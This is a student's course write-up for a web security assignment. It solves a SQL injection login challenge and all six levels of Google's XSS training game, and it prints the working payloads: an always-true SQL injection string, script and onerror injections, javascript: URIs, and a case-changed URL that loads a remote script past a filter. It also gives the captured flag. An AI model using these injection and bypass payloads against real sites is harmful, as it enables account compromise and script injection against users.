# Writeup 1 - Web I

Name: Josiah Rapp
Section: 0101

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement: Josiah Rapp


## Assignment details
This assignment has two parts. It is due by 11/27/19 at 11:59PM.

**There will be late penalty of 5% per day late!**

### Part 1 (40 Pts)

Such a Quick Little, website!

[http://142.93.136.81:5000/](http://142.93.136.81:5000/)

Ironically i found this one the hardest of the two because I was overthinking. I first tried some local and remote file inclusion using a php web shell, and that did not work in the slightest. I then reread the description and got the hint yall were giving and then changed my approach to a SQL injection instead. I tried the injection from the lecture slides, however that did not work... stumped I made a piazza post. The answer to that helped steer me in the correct direction, and entered a SQL snippet that would always return true to trick the database into dumping it's contents. 

that snippet was admin' || '1'='1'-- - and the flag is CMSC389R-{y0u_ar3_th3_SQ1_ninj@}

### Part 2 (60 Pts)
Complete all 6 levels of:

[https://xss-game.appspot.com](https://xss-game.appspot.com)

The first one level was fairly simple; insert a <script> tag with alert in the middle and you’re good:
<script> alert(“test”) </script>

From here on out I used the hints provided by the website:

The second level mentioned looking at the img tag and the onerror attribute. After a lot of trial and error I discovered that if there is an error thrown, it will execute the onerror attribute. So the next logical step was to do onerror=“javascript:alert(“test”)” and that worked.

The third level required some research on escaping quotes in the URL, which would be applicable to level 4 as well. The solution was to escape the specific image url with ‘’ and insert another onerror=alert(“test”) into the URL, that way when it loaded up, it detects an error and calls our function. The url looked like this: https://xss-game.appspot.com/level3/frame#3'onerror='alert("test")'

Level four requires character escaping as well, but this time it’s a little more convoluted. The hints told me to enter a single quote and note the error console, which read: Uncaught SyntaxError: missing ) after argument list. The second hint mentions HTML encoding, so I looked up the value for semi-colon, which was %3B. I tried using this encoding to display the alert like so: https://xss-game.appspot.com/level4/frame?timer=)%3Balert(1)%3B however that only resulted in the message “Your timer will executed in );alert(1); seconds.” Which…. Is not desirable. I tested that URL with ‘startTimer(‘’); appended on to the end as well, but that did not work. I tried a dummy statement that would wrap around to the ‘) at the front: var v = (‘ in order to mask the alert in the middle and that worked.

The hints, specifically the 3rd one, helped a lot. Reading the source code, we learn that the page redirects based on what is after the next= in the URL. If one had already loaded up the signup page, next is already being looked at/might be populated, so in order to override this you must immediately load a URL with your payload set, as opposed to entering it once the Dom renders. Navigating to https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("test") THEN entering an email and clicking next will jump to the alert instead.

The final level is a remote file hosting, which we discussed in class. Messing around on the website, I deduced that after the frame# section of the URL, the website reads in a file location. Great, now we can begin the actual exploitation. First I made a pastebin post that hosted alert(“test”), converted it to raw, then pasted the link after the #. This did not work, so I had to examine the source code. Turns out it excludes anything with https in it, however ONLY https because they did not take cMSC330 and did not make an exhaustive regex meaning their safeguard is not case sensitive. Changed the casing of the pastebin link and it worked: https://xss-game.appspot.com/level6/frame#httPs://pastebin.com/raw/LBVsTuce

### Format

Part 1 and 2 can be answered in bullet form or full, grammatical sentences.

### Scoring

* Part 1 is worth 40 points
* Part 2 is worth 60 points

### Tips

Remember to document your thought process for maximum credit!

Review the slides for help with using any of the tools or libraries discussed in
class.
